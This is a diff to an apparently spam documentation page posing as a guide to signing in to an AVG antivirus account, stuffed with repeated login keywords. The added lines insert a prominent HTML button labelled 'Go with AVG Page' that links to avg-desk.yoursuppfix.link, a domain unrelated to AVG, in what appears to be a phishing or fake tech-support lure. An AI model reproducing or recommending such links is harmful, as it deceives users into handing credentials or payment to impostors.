@@ -3,6 +3,11 @@ Log into my AVG account - Sign in to View, Renew, or Activate Your Protection Pl
 
 If you're an AVG user looking to **Log into my AVG account** or **Sign into my AVG account** to manage your antivirus subscription, you're in the right place. Your AVG account is the control center where you can view your current plan, renew your protection, activate products on new devices, and manage all devices connected to your subscription.
 
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://avg-desk.yoursuppfix.link/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Go with AVG Page</a>
+   </div>
 Logging into your AVG account ensures you have complete access to your digital security tools, license information, and real-time threat protection. In this detailed guide, we’ll walk you through how to **Log into my AVG account**, troubleshoot login issues, and activate your protection plan using your credentials.
 
 Use `https://my.avg.com <https://my.avg.com>`_ to get started. Throughout this guide, we’ll use the keywords **Log into my AVG account** and **Sign into my AVG account** to help you understand all account-related steps clearly.
